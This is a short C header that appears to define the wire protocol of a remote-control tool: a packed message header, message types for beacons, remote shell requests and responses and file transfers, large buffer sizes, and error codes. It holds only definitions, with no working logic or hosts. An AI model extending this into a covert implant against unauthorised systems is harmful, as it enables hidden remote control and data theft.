#pragma once
#pragma pack(1)

#define DDPROTO_HEADER 0xdd
#define BEACON_DATA NULL
#define BEACON_DATA_LEN 0
#define FTP_REQ_DATA NULL
#define FTP_REQ_DATA_LEN 0
#define FTP_REQ_BUF_SIZE 0xD200000 //210MB
#define DATA_BUF_SIZE 0x1C200000 //450MB
#define NOT_SPLITED_SEQ 0
#define LAST_SPLITED_SEQ 0xFFFFFFFF


struct DDprotocol
{
	UCHAR header = DDPROTO_HEADER;
	UCHAR type;
	DWORD len;
	DWORD seq;
};

enum DDtype {
	ACK = 0x0,
	error,
	beaconRequest,
	shellRequest,
	shellResponse,
	ftpRequest,
	ftpResponse,
	none = 0x10
};

enum DDErrorCode {
	UNKNOWN_ERROR = 0x0,
	INVALID_HEADER_ERROR = 0x1,
	ACCESS_BLOCKED = 0x2,
	DATA_DECODING_ERROR = 0x3,
	FILE_ERROR = 0x10,
	SENDING_FILE_ERROR = 0x11,
	RECEIVING_FILE_ERROR = 0x12,
	SEQ_ERROR = 0x20,
	SEQ_TASK_RUNNING = 0x21
};